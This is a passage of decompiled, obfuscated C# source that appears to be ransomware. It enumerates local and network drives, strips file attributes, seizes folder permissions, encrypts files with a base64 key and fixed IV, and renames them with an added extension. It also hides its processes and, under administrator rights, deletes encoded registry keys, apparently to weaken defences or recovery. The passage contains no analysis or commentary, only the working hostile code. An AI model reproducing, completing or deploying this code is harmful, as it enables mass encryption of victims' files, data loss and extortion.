							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && VIsIdhZRykLqTUQDB == getString_0(107397087))
						{
							list.Add(fileInfo.FullName);
							HOlhBPnTtrjV(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void HKRhfInFyEzhKfN()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107388850));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!jwBOsivrxmQ.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388797), getString_0(107397200)).Replace(getString_0(107388792), getString_0(107388797))
					.Replace(getString_0(107388783), getString_0(107389288))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					jwBOsivrxmQ.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388797), getString_0(107397200)).Replace(getString_0(107388792), getString_0(107388797))
						.Replace(getString_0(107388783), getString_0(107389288))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388810), getString_0(107389288)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string AWnjIktergta(string HqNOuicLNa = "", string sHaAjsFNxuuiOy = "")
	{
		string result = getString_0(107389288);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = HqNOuicLNa,
				Arguments = sHaAjsFNxuuiOy,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void uqSghrqYUYbs(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107388801),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string uWwQTdHjjsAYSYp(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string RdzltCKTqMftoSE(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void iUUVXROQaGoEty(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = RdzltCKTqMftoSE(getString_0(107388240));
		processStartInfo.Arguments = getString_0(107388211) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool zNFkxYSXyBRWl(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void qClNtAbWJO()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = uWwQTdHjjsAYSYp(getString_0(107388238));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(RdzltCKTqMftoSE(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(RdzltCKTqMftoSE(getString_0(107388100)));
					registryKey.DeleteSubKey(RdzltCKTqMftoSE(getString_0(107388075)));
					registryKey.DeleteSubKey(RdzltCKTqMftoSE(getString_0(107388026)));
					registryKey.DeleteSubKey(RdzltCKTqMftoSE(getString_0(107388033)));
					registryKey.DeleteSubKey(RdzltCKTqMftoSE(getString_0(107388240)));
					registryKey.DeleteSubKey(RdzltCKTqMftoSE(getString_0(107388520)));
					registryKey.DeleteSubKey(RdzltCKTqMftoSE(getString_0(107388491)));
					registryKey.Close();
				}
				string_ = uWwQTdHjjsAYSYp(getString_0(107388442));
				registryKey = Registry.LocalMachine.OpenSubKey(RdzltCKTqMftoSE(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(RdzltCKTqMftoSE(getString_0(107388345)));
					registryKey.Close();
				}
				string_ = uWwQTdHjjsAYSYp(getString_0(107388360));
				registryKey = Registry.LocalMachine.OpenSubKey(RdzltCKTqMftoSE(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(RdzltCKTqMftoSE(getString_0(107388345)));
					registryKey.Close();
				}
				string_ = uWwQTdHjjsAYSYp(getString_0(107388360));
				registryKey = Registry.CurrentUser.OpenSubKey(RdzltCKTqMftoSE(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(RdzltCKTqMftoSE(getString_0(107388345)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			AWnjIktergta(RdzltCKTqMftoSE(getString_0(107388311)), RdzltCKTqMftoSE(getString_0(107388326)));
			AWnjIktergta(RdzltCKTqMftoSE(getString_0(107387733)), RdzltCKTqMftoSE(uWwQTdHjjsAYSYp(getString_0(107387756))));
			AWnjIktergta(RdzltCKTqMftoSE(getString_0(107387733)), RdzltCKTqMftoSE(getString_0(107387578)));
			AWnjIktergta(RdzltCKTqMftoSE(getString_0(107387517)), RdzltCKTqMftoSE(getString_0(107387532)));
		}
		catch
		{
		}
	}

	public static void hfPzCBDyuj(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(RdzltCKTqMftoSE(getString_0(107387971)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void QXShVCvsvkRrTmR()
	{
		string string_ = uWwQTdHjjsAYSYp(getString_0(107387946));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(RdzltCKTqMftoSE(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(RdzltCKTqMftoSE(getString_0(107387833)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string LonrhPPaqu(string CydbSFivLwRDH, int RIBwmITXeHGD = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(RIBwmITXeHGD);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(CydbSFivLwRDH, 1, intPtr, ref RIBwmITXeHGD) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void yuTzVjQdrCIsBY()
	{
		AWnjIktergta(getString_0(107396434), RdzltCKTqMftoSE(getString_0(107387800)));
		string text = RdzltCKTqMftoSE(getString_0(107387094));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107388783) + text + getString_0(107388783) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396434);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void WexLWmlSQyxJV(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(MGkBzYPheHDPb, getString_0(107387029) + string_0 + getString_0(107387052) + ex.Message + getString_0(107396269));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string NRobqXdjvopcwE()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107389288);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107387443);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107387498))) ? getString_0(107387448) : getString_0(107387489));
				break;
			case 0:
				text = getString_0(107387471);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107387470);
				break;
			case 4:
				text = getString_0(107387457);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107387407) : getString_0(107387416));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107387383) : getString_0(107387388)) : getString_0(107387425)) : getString_0(107387434));
				break;
			case 10:
				text = getString_0(107387378);
				break;
			}
		}
		if (text != getString_0(107389288))
		{
			text = getString_0(107387405) + text;
			if (oSVersion.ServicePack != getString_0(107389288))
			{
				text = text + getString_0(107387392) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string DVTewTbLBZWx(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395374);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(RdzltCKTqMftoSE(getString_0(107395341)));
				streamWriter.WriteLine(getString_0(107396269));
				streamWriter.WriteLine(RdzltCKTqMftoSE(getString_0(107393363)));
				streamWriter.WriteLine(string_0);
				if (vzooNONBAAoJ)
				{
					streamWriter.WriteLine(getString_0(107396269));
					streamWriter.WriteLine(RdzltCKTqMftoSE(getString_0(107393285)));
					streamWriter.WriteLine(ohJtITMsrrTaVTo.NQaWQkkkRgsXVC());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !AcumuDDlRST)
				{
					File.AppendAllText(text, getString_0(107393252) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(MGkBzYPheHDPb, getString_0(107387355) + ex.Message + getString_0(107396269));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void bLbTvukAtwM(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		YkCLfojrYcVIAWn.TOlEmdVZzupto CS_0024_003C_003E8__locals0 = new YkCLfojrYcVIAWn();
		CS_0024_003C_003E8__locals0.kBxPEhJgsWQ = string_1;
		CS_0024_003C_003E8__locals0.FNoMAhwXyXFqhpl = string_2;
		CS_0024_003C_003E8__locals0.NcdJFcIQTBnl = string_3;
		CS_0024_003C_003E8__locals0.HFAvvYnqToNmgO = string_4;
		oybyixAEyQBUaM = Convert.FromBase64String(CS_0024_003C_003E8__locals0.NcdJFcIQTBnl);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396517))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = LonrhPPaqu(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !jwBOsivrxmQ.Contains(text))
							{
								jwBOsivrxmQ.Add(text);
							}
							else if (!jwBOsivrxmQ.Contains(array[i].Name))
							{
								jwBOsivrxmQ.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!jwBOsivrxmQ.Contains(array[i].Name))
							{
								jwBOsivrxmQ.Add(array[i].Name);
							}
						}
					}
					else if (!jwBOsivrxmQ.Contains(array[i].Name))
					{
						jwBOsivrxmQ.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!jwBOsivrxmQ.Contains(string_0[j]))
				{
					jwBOsivrxmQ.Add(string_0[j]);
				}
			}
		}
		if (jwBOsivrxmQ.Contains(RdzltCKTqMftoSE(getString_0(107387330))) && XmxvSLbGDWQx == getString_0(107396798))
		{
			jwBOsivrxmQ.Remove(RdzltCKTqMftoSE(getString_0(107387330)));
		}
		Parallel.ForEach(jwBOsivrxmQ, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new YkCLfojrYcVIAWn.TOlEmdVZzupto();
			CS_0024_003C_003E8__locals0.pZqvZRcoOOim = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP = string_0;
			if (kwebbXGLWFTcp && !NRobqXdjvopcwE().Contains(YkCLfojrYcVIAWn.getString_0(107387416)) && !NRobqXdjvopcwE().Contains(YkCLfojrYcVIAWn.getString_0(107404148)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						zNFkxYSXyBRWl(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (PEOsufOVorqNP == YkCLfojrYcVIAWn.getString_0(107396807))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					TbeJLLDmzCkm(CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP, CS_0024_003C_003E8__locals0.pZqvZRcoOOim.kBxPEhJgsWQ, CS_0024_003C_003E8__locals0.pZqvZRcoOOim.HFAvvYnqToNmgO, CS_0024_003C_003E8__locals0.pZqvZRcoOOim.FNoMAhwXyXFqhpl, CS_0024_003C_003E8__locals0.pZqvZRcoOOim.NcdJFcIQTBnl);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				TbeJLLDmzCkm(CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP, CS_0024_003C_003E8__locals0.kBxPEhJgsWQ, CS_0024_003C_003E8__locals0.HFAvvYnqToNmgO, CS_0024_003C_003E8__locals0.FNoMAhwXyXFqhpl, CS_0024_003C_003E8__locals0.NcdJFcIQTBnl);
			}
		});
	}

	public static void TbeJLLDmzCkm(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107389288));
		List<string> list3 = list2;
		if (WjKjLyPEIXdw == getString_0(107397087))
		{
			list = UJWemBgyHUdQl(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = xNoMbXrswm.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039b;
					}
				}
				if ((LNYeQleHVCaotD == getString_0(107397087) && !item.EndsWith(text)) || ngVLNnblfHHw.Contains(item))
				{
					continue;
				}
				if (hbiMFBxXkVIgur == getString_0(107396798))
				{
					try
					{
						if (QeMFAvXech.PRtgpcDOjtZQp(item))
						{
							QeMFAvXech.lJHkFdxPppFD(item);
						}
					}
					catch
					{
					}
				}
				ngVLNnblfHHw.Add(item);
				if (!CyfMkozTWVl.Contains(Path.GetDirectoryName(item)))
				{
					CyfMkozTWVl.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (DuwAfCYTUCT == getString_0(107396798) && fileStream.Length > Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024 && !list3.Contains(text))
					{
						if (SFDpinVUmMSqKHuE == getString_0(107396798))
						{
							foreach (string item2 in sAdxWTwIriShHsff)
							{
								if (item.ToLower().EndsWith(item2) && YzEXDgkVctSKX == getString_0(107396798))
								{
									if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											ohJtITMsrrTaVTo.qhGPXbNSyvCayd(getString_0(107389849), getString_0(107389844), getString_0(107389863), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && YzEXDgkVctSKX == getString_0(107397087))
								{
									try
									{
										ohJtITMsrrTaVTo.qhGPXbNSyvCayd(getString_0(107389849), getString_0(107389844), getString_0(107389863), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = laLXjNdfIrlJ.STmRWaBeQYVyn(item, Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024);
						byte[] wUAqTrQObZUDJY = laLXjNdfIrlJ.ECnCWBxOsfyplx(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						laLXjNdfIrlJ.aOycAYsEuHTjq(item, wUAqTrQObZUDJY);
						if (string_2 != getString_0(107387289))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107387289))
					{
						YRoXysRBkitV(item, item + string_2, oybyixAEyQBUaM);
					}
					else
					{
						YRoXysRBkitV(item, item + getString_0(107387284), oybyixAEyQBUaM);
					}
				}
				catch (Exception)
				{
				}
				IL_039b:;
			}
		}
	}

	public static void HOlhBPnTtrjV(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		VwdjWlzHHKKh.FxgjJBeAgKI CS_0024_003C_003E8__locals0 = new VwdjWlzHHKKh();
		CS_0024_003C_003E8__locals0.UWBePPalaohE = list_0;
		CS_0024_003C_003E8__locals0.utySFCfMcfJj = string_1;
		CS_0024_003C_003E8__locals0.nwbGeFCbtFNo = string_2;
		CS_0024_003C_003E8__locals0.pPYjMJSGlCKrKN = string_3;
		CS_0024_003C_003E8__locals0.wyBNNoIkpYPp = new List<string> { getString_0(107389288) };
		if (LNYeQleHVCaotD == getString_0(107397087))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.UWBePPalaohE)
				{
					if (CS_0024_003C_003E8__locals0.nwbGeFCbtFNo.Length != 0)
					{
						string[] nwbGeFCbtFNo2 = CS_0024_003C_003E8__locals0.nwbGeFCbtFNo;
						int num2 = 0;
						while (num2 < nwbGeFCbtFNo2.Length)
						{
							string value2 = nwbGeFCbtFNo2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_09a3;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.utySFCfMcfJj))
						{
							goto IL_09a3;
						}
					}
					catch (Exception)
					{
						goto IL_09a3;
					}
					if (item.EndsWith(string_0) && !ngVLNnblfHHw.Contains(item))
					{
						if (hbiMFBxXkVIgur == VwdjWlzHHKKh.getString_0(107396815))
						{
							try
							{
								if (QeMFAvXech.PRtgpcDOjtZQp(item))
								{
									QeMFAvXech.lJHkFdxPppFD(item);
								}
							}
							catch
							{
							}
						}
						ngVLNnblfHHw.Add(item);
						if (!CyfMkozTWVl.Contains(Path.GetDirectoryName(item)))
						{
							CyfMkozTWVl.Add(Path.GetDirectoryName(item));
						}
						WexLWmlSQyxJV(item);
						try
						{
							new PEjkbesuAo().YJnTvaOXFymvWeYd(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (RiGciHwEXLcD)
									{
										Console.WriteLine(VwdjWlzHHKKh.getString_0(107404111) + item + VwdjWlzHHKKh.getString_0(107404066) + new FileInfo(item).Length + VwdjWlzHHKKh.getString_0(107404045));
										Console.WriteLine(VwdjWlzHHKKh.getString_0(107404036));
									}
								}
								catch
								{
								}
								AWnjIktergta(RdzltCKTqMftoSE(VwdjWlzHHKKh.getString_0(107403963)), VwdjWlzHHKKh.getString_0(107388800) + item + VwdjWlzHHKKh.getString_0(107388800) + RdzltCKTqMftoSE(VwdjWlzHHKKh.getString_0(107403906)) + VwdjWlzHHKKh.getString_0(107388800) + Environment.UserName + VwdjWlzHHKKh.getString_0(107388800) + RdzltCKTqMftoSE(VwdjWlzHHKKh.getString_0(107403921)));
							}
						}
						catch (Exception ex16)
						{
							if (VLajbDNhoSbf)
							{
								try
								{
									File.AppendAllText(MGkBzYPheHDPb, VwdjWlzHHKKh.getString_0(107387046) + item + VwdjWlzHHKKh.getString_0(107404408) + ex16.Message + VwdjWlzHHKKh.getString_0(107396286));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_02cd;
								}
								goto end_IL_02cd_2;
								end_IL_02cd:;
							}
							catch (Exception ex18)
							{
								if (VLajbDNhoSbf)
								{
									try
									{
										File.AppendAllText(MGkBzYPheHDPb, VwdjWlzHHKKh.getString_0(107387046) + item + VwdjWlzHHKKh.getString_0(107404295) + ex18.Message + VwdjWlzHHKKh.getString_0(107396286));
									}
									catch (Exception)
									{
									}
								}
								uAQgXZmBeIANml++;
								goto end_IL_02cd_2;
							}
							if (!(DuwAfCYTUCT == VwdjWlzHHKKh.getString_0(107396815)) || new FileInfo(item).Length <= Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024 || CS_0024_003C_003E8__locals0.wyBNNoIkpYPp.Contains(string_0))
							{
								if (vzooNONBAAoJ)
								{
									CS_0024_003C_003E8__locals0.utySFCfMcfJj = zwSwCGajjNfu + CS_0024_003C_003E8__locals0.utySFCfMcfJj;
								}
								string text5 = NtziTGPOOPUxYBAz.zEQGtyDgSaEtAI(32);
								string text6 = VwdjWlzHHKKh.getString_0(107389305);
								text6 = (AcumuDDlRST ? NtziTGPOOPUxYBAz.FPMzCARIEhq() : VwdjWlzHHKKh.getString_0(107389305));
								string s3 = CEfwFkxuuHuowy.CfhzgVmlFFzI(text5 + text6);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != VwdjWlzHHKKh.getString_0(107387306))
								{
									if (!qtSCtAyEKwnBa)
									{
										if (!AcumuDDlRST)
										{
											XiqCbtvoxi(item, item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, oybyixAEyQBUaM);
										}
										else
										{
											XiqCbtvoxi(item, item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, Convert.FromBase64String(text5));
										}
									}
									else
									{
										try
										{
											if (!AcumuDDlRST)
											{
												FvQSVpHgjxqhRPuFc(item, item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
											}
											else
											{
												FvQSVpHgjxqhRPuFc(item, item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
											}
										}
										catch (Exception ex20)
										{
											if (VLajbDNhoSbf)
											{
												try
												{
													File.AppendAllText(MGkBzYPheHDPb, VwdjWlzHHKKh.getString_0(107387046) + item + VwdjWlzHHKKh.getString_0(107387324) + ex20.Message + VwdjWlzHHKKh.getString_0(107396286));
												}
												catch (Exception)
												{
												}
											}
											uAQgXZmBeIANml++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_02cd_2;
										}
									}
								}
								else if (!qtSCtAyEKwnBa)
								{
									if (!AcumuDDlRST)
									{
										XiqCbtvoxi(item, item + VwdjWlzHHKKh.getString_0(107387301), oybyixAEyQBUaM);
									}
									else
									{
										XiqCbtvoxi(item, item + VwdjWlzHHKKh.getString_0(107387301), Convert.FromBase64String(text5));
									}
								}
								else
								{
									try
									{
										if (!AcumuDDlRST)
										{
											FvQSVpHgjxqhRPuFc(item, item, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
										}
										else
										{
											FvQSVpHgjxqhRPuFc(item, item, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
										}
									}
									catch (Exception ex23)
									{
										if (VLajbDNhoSbf)
										{
											try
											{
												File.AppendAllText(MGkBzYPheHDPb, VwdjWlzHHKKh.getString_0(107387046) + item + VwdjWlzHHKKh.getString_0(107387324) + ex23.Message + VwdjWlzHHKKh.getString_0(107396286));
											}
											catch (Exception)
											{
											}
										}
										uAQgXZmBeIANml++;
										goto end_IL_02cd_2;
									}
								}
								if (AcumuDDlRST)
								{
									if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != VwdjWlzHHKKh.getString_0(107387306))
									{
										hfPzCBDyuj(item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, bytes3);
									}
									else
									{
										hfPzCBDyuj(item, bytes3);
									}
								}
								goto IL_09a3;
							}
							CS_0024_003C_003E8__locals0 = new VwdjWlzHHKKh.kmkVkorxgP();
							CS_0024_003C_003E8__locals0.XgsyVUPRwpozAEJ = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != VwdjWlzHHKKh.getString_0(107387306))
								{
									if (vzooNONBAAoJ)
									{
										CS_0024_003C_003E8__locals0.utySFCfMcfJj = zwSwCGajjNfu + CS_0024_003C_003E8__locals0.utySFCfMcfJj;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.utySFCfMcfJj);
								}
							}
							catch (Exception ex25)
							{
								if (VLajbDNhoSbf)
								{
									try
									{
										File.AppendAllText(MGkBzYPheHDPb, VwdjWlzHHKKh.getString_0(107387046) + item + VwdjWlzHHKKh.getString_0(107404234) + ex25.Message + VwdjWlzHHKKh.getString_0(107396286));
									}
									catch (Exception)
									{
									}
								}
								uAQgXZmBeIANml++;
								goto end_IL_02cd_2;
							}
							CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm = VwdjWlzHHKKh.getString_0(107389305);
							if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != VwdjWlzHHKKh.getString_0(107387306))
							{
								CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm = item + CS_0024_003C_003E8__locals0.utySFCfMcfJj;
							}
							else
							{
								CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm = item;
							}
							if (SFDpinVUmMSqKHuE == VwdjWlzHHKKh.getString_0(107396815))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in sAdxWTwIriShHsff)
									{
										if (CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.XgsyVUPRwpozAEJ.utySFCfMcfJj) && YzEXDgkVctSKX == VwdjWlzHHKKh.kmkVkorxgP.getString_0(107396818))
										{
											if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm).Length)
											{
												try
												{
													ohJtITMsrrTaVTo.qhGPXbNSyvCayd(VwdjWlzHHKKh.kmkVkorxgP.getString_0(107389869), VwdjWlzHHKKh.kmkVkorxgP.getString_0(107389864), VwdjWlzHHKKh.kmkVkorxgP.getString_0(107389883), CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm.ToLower().EndsWith(item2) && YzEXDgkVctSKX == VwdjWlzHHKKh.kmkVkorxgP.getString_0(107397107))
										{
											try
											{
												ohJtITMsrrTaVTo.qhGPXbNSyvCayd(VwdjWlzHHKKh.kmkVkorxgP.getString_0(107389869), VwdjWlzHHKKh.kmkVkorxgP.getString_0(107389864), VwdjWlzHHKKh.kmkVkorxgP.getString_0(107389883), CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							string text7 = NtziTGPOOPUxYBAz.zEQGtyDgSaEtAI(32);
							string text8 = VwdjWlzHHKKh.getString_0(107389305);
							text8 = (AcumuDDlRST ? NtziTGPOOPUxYBAz.FPMzCARIEhq() : VwdjWlzHHKKh.getString_0(107389305));
							string s4 = CEfwFkxuuHuowy.CfhzgVmlFFzI(text7 + text8);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
